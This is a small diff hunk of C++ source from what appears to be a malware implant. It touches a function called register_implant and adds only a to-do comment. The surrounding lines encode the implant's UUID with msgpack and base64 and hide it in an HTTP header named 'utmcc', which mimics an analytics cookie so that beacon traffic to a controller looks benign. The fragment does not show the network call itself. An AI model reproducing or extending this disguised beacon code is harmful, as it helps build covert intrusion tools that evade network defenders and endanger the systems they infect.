@@ -9,6 +9,7 @@ std::string register_implant() {
     std::vector<uint8_t> http_response_buffer;
 
     // Define headers (No \r\n needed)
+    //do this dynamically later
     std::vector<std::wstring> headers = {
         //msgpack -> b64: {"implant_uuid":"00000-00...."}
         L"utmcc: gaxpbXBsYW50X3V1aWTZIzAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAw"
